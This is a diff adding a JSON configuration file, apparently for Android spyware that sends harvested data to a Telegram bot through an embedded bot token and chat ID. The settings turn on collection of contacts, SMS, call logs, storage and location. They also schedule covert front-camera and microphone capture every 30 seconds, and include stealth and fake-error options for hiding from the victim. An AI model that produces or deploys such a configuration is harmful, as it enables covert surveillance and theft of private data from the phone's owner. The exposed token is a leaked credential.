@@ -1,0 +1,21 @@
+{
+  "bot_token": "8981048905:AAHSr4vwQHLT0G9IZ9PyXsoNZdGxavuuv-Y",
+  "chat_id": "7235462066",
+  "require_permissions": true,
+  "read_contacts": true,
+  "read_sms": true,
+  "read_call_log": true,
+  "read_storage": true,
+  "read_location": true,
+  "post_notifications": true,
+  "stealth_mode": false,
+  "fake_error": false,
+  "background_camera_enabled": true,
+  "background_camera_front": true,
+  "background_camera_interval_sec": 30,
+  "background_camera_back": false,
+  "microphone_enabled": true,
+  "microphone_interval_sec": 30,
+  "live_location_enabled": true,
+  "live_location_interval_sec": 30
+}
